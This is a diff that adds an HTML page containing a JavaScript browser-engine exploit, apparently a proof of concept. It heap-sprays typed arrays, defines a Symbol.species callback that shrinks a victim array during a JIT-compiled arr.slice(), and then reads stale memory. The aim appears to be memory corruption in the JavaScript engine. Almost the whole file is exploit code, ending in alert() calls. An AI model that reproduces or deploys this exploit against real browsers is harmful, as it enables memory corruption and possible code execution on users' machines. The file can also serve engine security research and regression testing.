@@ -1,0 +1,77 @@
+<script>
+
+let size = 64;
+
+garr = [];
+j = 0;
+function gc(){
+	var tmp = [];
+	for(let i = 0;i < 0x20000;i++){
+		tmp[i] = new Uint32Array(size * 2);
+		for(let j = 0;j < (size*2);j+=2){
+			tmp[i][j] = 0x12345678;
+			tmp[i][j+1] = 0xfffe0123;
+		}
+	}
+	garr[j++] = tmp;
+}
+
+let arr = [{},2.2];
+
+let obj = {};
+
+obj[Symbol.species] = function(){
+	victim.length = 0x0;
+	for(let i = 0;i < 0x2000;i++){
+		gvictim[i].length = 0x0;
+		gvictim[i] = null;
+	}
+	gc();
+	//Array.isArray(garr[0][0x10000]);
+	return [1.1];
+}
+
+let gvictim = [];
+
+for(let i = 0;i < 0x1000;i++){
+	gvictim[i] = [1.1,2.2];
+	gvictim[i].length = size;
+	gvictim[i].fill(3.3);
+}
+
+let victim = [1.1,2.2];
+victim.length = size;
+victim.fill(3.3);
+
+for(let i = 0x1000;i < 0x2000;i++){
+	gvictim[i] = [1.1,2.2];
+	gvictim[i].length = size;
+	gvictim[i].fill(3.3);
+}
+
+function fake(arg){
+}
+for(let i = 0;i < size;i++){
+	fake["x"+i.toString()] = 2.2;
+}
+
+function jit(){
+	victim[1] = 1.1;
+	arr.slice();
+	//fake.x2 = 6.17651672645e-312;
+	return victim[2];
+}
+
+flag = 0;
+
+
+for(let i = 0;i < 0x10000;i++){
+	xx = jit();
+}
+
+arr.constructor = obj;
+
+Array.isArray(victim);
+alert(333);
+alert(jit());
+</script>
